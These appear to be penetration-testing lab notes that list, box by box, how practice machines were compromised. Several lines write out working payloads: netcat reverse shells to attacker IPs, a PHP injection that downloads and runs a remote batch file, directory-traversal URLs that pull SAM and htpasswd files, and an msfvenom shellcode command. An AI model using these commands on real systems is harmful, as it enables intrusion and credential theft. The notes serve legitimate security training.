## Paths to Victory


1. Unusual nmap ftp output
2. Retrieve file with hash
3. Use credentials to connect to admin interface on website
4. Upload netcat.exe, then php file including system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe'); that triggers netcat.exe to get a shell
5. Upload jsp shell file to web app that's running as admin in folder exposed to internet
sc config servicename binPath= "C:\Path\To\New\Service.exe"

1. Find version through network developers tool section where it's retrieving/using a js file
2. There are various exploits and vulnerabilities, and it ends up being one that was newer than the version

1. Website vulnerable to directory traversal and LFI, found through search
2. Retrieve/wget old SAM and SYSTEM files located in "http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csystem.old"
3. Pwdump to get hashes
4. Login to RDP

1. Few ports open on linux, 22, 80, 389 & 443
2. Find exploit for the nagios webapp from a niche security blog
3. Get www-data user, and use the same exploit to escalate privs to root

1. FreeSWITCH is running as webapp
2. Find RCE exploit, test that it's working
3. Upload nc.exe with PowerShell with exploit
4. Trigger nc.exe with exploit
5. Machine has vulnerable service path
6. Rename existing service
7. Upload/rename rev binary to path folder
8. Reboot machine

1. Find admin interface on Blogengine.net webapp
2. User/pass is Admin:Admin found with hydra brute force
3. Find exploit
4. Rename exploit to PostView.ascx and get webshell
5. iwr command for normal shell
6. Exploit SeCreateTokenPrivilege with file from https://www.greyhathacker.net/?p=1025 and run maybe 20 times
1. Three separate webapps,api,login with many rabbit holes, buggy ftp with anon access, smb, etc.

1. Bunch of web service with an api
2. CSRF via one of the apis, tested with curl (deep rabbit hole with ruby webapp login and routes)
3. Execute nc revshell on same port as api
4. With sudo -l /sbin/reboot, and modifiable /etc/systemd/system/pythonapp.service, changed file User param to root and rebooted
5. Same api nc command, but as root this time

1. Struggling smb session, wonky website, Windows workgroup for linux website, all distract from vulnerable SMTP version
2. ExploitDB exploits work enough to ping but nothing else
3. Go on github and try a few until one works

1. Weird ssh port, taunting website with nothing to show, smtp and snmp open
2. Snmp show clamav running in blackhole mode
3. Go exploit works from github, only with bindshell

1. Dir brute until reach download.php
2. LFI in download.php?path=../../../../../../../xampp/security/webdav.htpasswd
3. Crack hash
4. Upload netcat, "curl --user 'wampp:password' -T nc.exe http://targetip/webdev/nc.exe"
5. Upload php command shell
6. Trigger netcat, 'http://targetip/webdav/cmd.php?cmd=nc+-e+cmd.exe+$myip+53'
7. Vulnerable webdav version

1. Vulnerable webapp version
2. Generate shellcode, 'msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST=192.168.45.178 LPORT=80 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode'
3. Get root shell

1. Hidden directory in robots.txt
2. KikChat is vulnerable
3. Test and get more info, 'curl -s http://targetip/23423/rooms/get.php\?name=info.php\&ROOM\="<?php phpinfo()+?>"'
4. See that allow_url_fopen and allow_url_include are On
5. Upload bat file to target machine, 'curl -s http://targetip/23423/rooms/get.php\?name=info.php\&ROOM\="<?php+file_put_contents('nc.bat',file_get_contents('http://$myip/nc.txt'));system('nc.bat');usleep(2000000);system('nc.exe+-nv+$targetip+1234+-cmd+cmd.exe');+?>"
6. Once on the machine, replace process with revshell